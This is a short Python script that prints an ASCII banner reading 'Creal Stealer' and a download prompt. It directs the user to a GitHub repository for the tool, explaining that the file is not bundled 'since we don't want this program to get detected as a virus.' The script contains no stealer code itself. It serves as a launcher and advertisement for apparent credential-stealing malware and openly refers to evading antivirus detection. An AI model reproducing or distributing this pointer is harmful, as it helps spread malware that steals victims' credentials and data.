import time
import os
from datetime import date

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

today = date.today()
  
def clearcmd():
    os.system('cls' if os.name == 'nt' else 'clear')

def ultimategrabber():
  print(bcolors.OKBLUE + "Today's date:",today)
  print(bcolors.OKBLUE + """                      
_________                       .__      _________ __                .__                
\_   ___ \_______   ____ _____  |  |    /   _____//  |_  ____ _____  |  |   ___________ 
/    \  \/\_  __ _/ __ \\__  \ |  |    \_____  \\   __\/ __ \\__  \ |  | _/ __ \_  __ 
\     \____|  | \/\  ___/ / __ \|  |__  /        \|  | \  ___/ / __ \|  |_\  ___/|  | \/
 \______  /|__|    \___  >____  /____/ /_______  /|__|  \___  >____  /____/\___  >__|   
        \/             \/     \/               \/           \/     \/          \/             
                                  
              Download                                                                 
        """)
  print(bcolors.OKBLUE + """
    You need to download the file, since we don't want this program to get detected as a virus.
    https://github.com/Ayhuuu/Creal-Stealer
    """)
  time.sleep(10.00)
ultimategrabber()
